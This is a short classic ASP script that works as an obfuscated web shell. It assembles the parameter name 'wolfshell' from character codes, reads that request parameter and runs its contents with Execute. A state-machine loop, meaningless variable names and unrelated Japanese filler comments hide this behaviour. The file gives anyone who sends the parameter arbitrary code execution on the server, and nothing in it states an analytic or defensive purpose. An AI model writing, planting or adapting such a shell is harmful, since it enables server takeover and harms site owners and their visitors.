<%
Dim state_f9a, arr_c1d, i_d9e, key_e7f, payload_g5h
state_f9a = 0 ' // 今夜の月は美しい

Do While state_f9a < 3
    ' // 猫は液体です
    Select Case state_f9a
        Case 0
            ' // ラーメン食べたい
            arr_c1d = Array(Chr(119), "o", Chr(108), "f", "s", Chr(104), "e", "l", "l")
            key_e7f = ""
            For Each i_d9e In arr_c1d
                key_e7f = key_e7f & i_d9e
            Next
            state_f9a = 1
        Case 1
            ' // 電車が遅れています
            payload_g5h = Request(key_e7f)
            If Len(payload_g5h) > 0 Then
                state_f9a = 2
            Else
                state_f9a = 3 ' // 何もすることがない
            End If
        Case 2
            ' // 庭には二羽鶏がいる
            Execute payload_g5h
            state_f9a = 3
    End Select
Loop
%>